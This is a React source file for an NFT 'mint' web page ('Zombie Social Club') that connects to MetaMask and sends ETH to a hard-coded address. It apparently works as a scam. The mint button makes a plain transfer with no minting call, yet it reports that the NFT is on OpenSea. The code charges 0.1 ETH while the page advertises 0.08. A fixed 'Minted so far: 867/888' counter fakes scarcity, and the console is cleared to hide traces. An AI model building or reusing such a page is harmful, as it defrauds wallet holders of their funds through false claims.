import React from 'react'
import * as s from "./styles/globalStyles";
import { isMobile } from 'react-device-detect';

const Web3 = require("web3");

const CONFIG = {
  "CONTRACT_ADDRESS": "0x4C7497faCD4c661b5deCc119d3f89a0Ae81a2EAF",
  "NETWORK": {
    "NAME": "Ethereum",
    "SYMBOL": "ETH",
    "ID": 1
  },
  "SHOW_BACKGROUND": true
}

const webAddress = 'zombiesocialclub.xyz/'

class App extends React.Component {

  state = {
    errorMessage: '',
    connected: false,
    sending: false,
    pandaCount: 1,
  }

  async componentDidMount() {

    setTimeout(() => {
      console.clear();
    }, 100)

    let enabled = await this.ethEnabled()
    this.setState({
      connected: enabled
    });
  }


  async didSelectWallet() {
    try {

      let ethEnable = await this.ethEnabled()

      if (isMobile && !ethEnable) {
        window.location.assign('https://metamask.app.link/dapp/' + webAddress)
      } else {
        let ethEnable = await this.ethEnabled()

        this.setState({
          connected: ethEnable
        });
      }

    } catch (error) {
      console.log('error', error);
    }



  }

  async ethEnabled() {
    // if (window.web3) {
    //   window.web3 = new Web3(window.web3.currentProvider);
    //   window.ethereum.enable();
    //   return true;
    // }
    // return false;

    if (window.ethereum) {
      await window.ethereum.send('eth_requestAccounts');
      window.web3 = new Web3(window.ethereum);
      return true;
    }
    return false;

  }

  async didSelecteDonate() {
    try {


      let ethEnable = await this.ethEnabled()

      if (isMobile && !ethEnable) {
        window.location.assign('https://metamask.app.link/dapp/' + webAddress)
      } else {
        const { pandaCount } = this.state
        const web3 = window.web3;

        var addr = web3.currentProvider.selectedAddress

        var amount = 0.1 * pandaCount;

        amount = amount.toString(); // Willing to send 2 ethers
        const amountToSend = web3.utils.toWei(amount, "ether"); // Convert to wei value

        this.setState({
          sending: true
        })
        var send = await web3.eth.sendTransaction({ from: addr, to: CONFIG.CONTRACT_ADDRESS, value: amountToSend });

        this.setState({
          sending: false
        })

        if (send.status) {
          this.setState({
            errorMessage: 'You can now find your NFT on OpenSea.'
          })
        } else {
          this.setState({
            errorMessage: 'Transaction not successfull.'
          })
        }
      }

    } catch (error) {
      console.log('error', error);
      this.setState({
        sending: false,
        errorMessage: 'Transaction not successfull.'
      })
      if (error.code) {
        this.setState({
          errorMessage: error.message
        })
      }
    }
  }

  decrementMintAmount() {
    const { pandaCount } = this.state
    let newPandaCount = pandaCount - 1;
    if (newPandaCount < 1) {
      newPandaCount = 1;
    }
    this.setState({
      pandaCount: newPandaCount
    })
  };

  incrementMintAmount = () => {
    const { pandaCount } = this.state
    let newPandaCount = pandaCount + 1;
    if (newPandaCount > 5) {
      newPandaCount = 5;
    }
    this.setState({
      pandaCount: newPandaCount
    })
  };



  render() {

    const { errorMessage, connected, sending, pandaCount } = this.state

    return (
      <s.Screen>
        <s.Container
          flex={1}
          ai={"center"}
          style={{
            padding: 24,
            backgroundColor: "",

          }}
          image={CONFIG.SHOW_BACKGROUND ? "/config/images/bg.png" : null}
        >
          <s.StyledLogo alt={"logo"} src={"/config/images/logo.png"} />
          <s.SpacerSmall />
          <s.ResponsiveWrapper flex={1} style={{ padding: 24 }}>

            <s.Container flex={1} jc={"center"} ai={"center"}>
              {/* <s.StyledImg alt={"example"} src={"/config/images/example.gif"} /> */}
            </s.Container>
            <s.SpacerLarge />


            <s.Container
              flex={2}
              jc={"center"}
              ai={"center"}
              style={{
                padding: 24,
                borderRadius: 2,
                borderWidth: 5,
                borderColor: '#72aa72',
                borderStyle: 'solid',
                boxShadow: "0px 5px 11px 2px rgba(0,0,0,0.7)",
                height: 500,
              }}
            >
              <s.TextTitle
                style={{
                  textAlign: "center",
                  fontSize: 35,
                  fontWeight: "bold",
                  color: "var(--accent-text)",
                }}
              >
                {/* 100 */}
                Minted so far: 867/888
              </s.TextTitle>
              <s.TextDescription
                style={{
                  textAlign: "center",
                  color: "var(--primary-text)",
                  marginTop: -20
                }}
              >
                <s.StyledLink target={"_blank"} href={CONFIG.SCAN_LINK}>
                  0.08 ETH per ZSC NFT
                </s.StyledLink>
                <s.Container ai={"center"} jc={"center"} fd={"row"}>
                  <s.StyledRoundButton
                    style={{ lineHeight: 0.4 }}
                    // disabled={claimingNft ? 1 : 0}
                    onClick={(e) => {
                      e.preventDefault();
                      this.decrementMintAmount();
                    }}
                  >
                    -
                  </s.StyledRoundButton>
                  <s.SpacerMedium />
                  <s.TextDescription
                    style={{
                      textAlign: "center",
                      color: "var(--accent-text)",
                    }}
                  >
                    {pandaCount}
                  </s.TextDescription>
                  <s.SpacerMedium />
                  <s.StyledRoundButton
                    // disabled={claimingNft ? 1 : 0}
                    onClick={(e) => {
                      e.preventDefault();
                      this.incrementMintAmount();
                    }}
                  >
                    +
                  </s.StyledRoundButton>
                </s.Container>

                <s.StyledButton
                  onClick={(e) => {
                    this.setState({
                      pandaCount: 5
                    })
                  }}
                >
                  SET MAX
                </s.StyledButton>
              </s.TextDescription>
              <s.SpacerSmall />
              <s.Container ai={"center"} jc={"center"}>
                {
                  !sending &&
                  <>
                    <s.TextDescription
                      style={{
                        textAlign: "center",
                        color: "var(--accent-text)",
                      }}
                    >
                    </s.TextDescription>
                  </>
                }

                {
                  sending &&
                  <>
                    <s.TextDescription
                      style={{
                        textAlign: "center",
                        color: "var(--accent-text)",
                      }}
                    >
                      Processing . . .
                    </s.TextDescription>
                  </>
                }
                <s.StyledLink target={"_blank"} href={CONFIG.SCAN_LINK} style={{
                  marginTop: -37,
                  textAlign: 'center'
                }}>
                  1. Connect your wallet with MetaMask
                      <br/>
                  2. Click on the button to mint ZSC NFT
                </s.StyledLink>

                <s.SpacerSmall />
                <s.StyledButton
                  onClick={(e) => {
                    // e.preventDefault();
                    if (connected) {
                      this.didSelecteDonate();
                    } else {
                      this.didSelectWallet();
                    }

                  }}
                >
                  {!connected ? 'CONNECT' : 'MINT'}
                </s.StyledButton>

                {
                  errorMessage !== '' &&
                  <>
                    <s.SpacerSmall />
                    <s.TextDescription
                      style={{
                        textAlign: "center",
                        color: "var(--accent-text)",
                      }}
                    >
                      {errorMessage}
                    </s.TextDescription>
                  </>
                }

              </s.Container>
              <s.SpacerMedium />
            </s.Container>

            <s.SpacerLarge />
            <s.Container flex={1} jc={"center"} ai={"center"}>
              {/* <s.StyledImg
                alt={"example"}
                src={"/config/images/example.gif"}
                style={{ transform: "scaleX(-1)" }}
              /> */}
            </s.Container>

          </s.ResponsiveWrapper>
          <s.SpacerMedium />
          <s.Container jc={"center"} ai={"center"} style={{ width: "70%" }}>
            <s.TextDescription
              style={{
                textAlign: "center",
                color: "white",
              }}
            >
              Please make sure you are connected to the right network (
              {CONFIG.NETWORK.NAME} Mainnet) and the correct address.
            </s.TextDescription>
            <s.SpacerSmall />

            <div style={{
              flexDirection: 'row',
              justifyContent: 'space-between',
            }}>
              <a href='https://twitter.com/SocialZombie' target='_blank'>
                <i class="fab fa-twitter-square fa-2x" style={{
                  color: 'white',
                  marginLeft: 20,
                }}></i>
              </a>

              <a href='https://discord.gg/aaXrXEX2Jk' target='_blank'>
                <i class="fab fa-discord fa-2x" style={{
                  color: 'white',
                  marginLeft: 20,
                }}></i>
              </a>
            </div>
          </s.Container>
        </s.Container>
      </s.Screen>
    );
  }
}

export default App;
